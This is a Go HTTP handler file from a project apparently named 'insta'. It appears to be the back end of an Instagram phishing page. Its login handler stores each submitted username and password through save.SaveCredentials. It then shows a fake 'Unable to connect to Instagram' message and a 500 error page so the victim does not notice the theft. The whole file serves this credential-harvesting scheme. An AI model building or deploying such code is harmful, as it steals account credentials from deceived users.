package handler

import (
	"github.com/tawesoft/golib/v2/dialog"
	"insta/pkg/check"
	"insta/pkg/config"
	"insta/pkg/render"
	"insta/pkg/save"
	"net/http"
	"regexp"
)

// Repository is the repository type
type Repository struct {
	App *config.AppConfig
}

func NewRepo(a *config.AppConfig) *Repository {
	return &Repository{
		App: a,
	}
}

// Repo the repository used by the handlers
var Repo *Repository

// NewHandlers sets the repository for the handlers
func NewHandlers(r *Repository) {
	Repo = r
}

func (m *Repository) Index(w http.ResponseWriter, r *http.Request) {

	//remoteIp := r.RemoteAddr
	//m.App.Session.Put(r.Context(), "remote_ip", remoteIp)
	render.RenderTemplate(w, "index.html")
}

func (m *Repository) LoginHandler(w http.ResponseWriter, r *http.Request) {

	if err := r.ParseForm(); err != nil {
		http.Error(w, "ParseForm error", http.StatusInternalServerError)
		return
	}
	uName := r.FormValue("u_name")
	pass := r.FormValue("pass")

	// Validate username

	match, _ := regexp.MatchString("^[a-zA-Z0-9._]+$", uName)

	if len(uName) > 2 && len(uName) < 30 && match && len(pass) > 7 && check.Username(uName) {

		save.SaveCredentials(uName, pass)
		dialog.Alert("Unable to connect to Instagram")
		render.RenderTemplate(w, "500.html")
	} else {
		render.RenderTemplate(w, "index.html")
	}

}
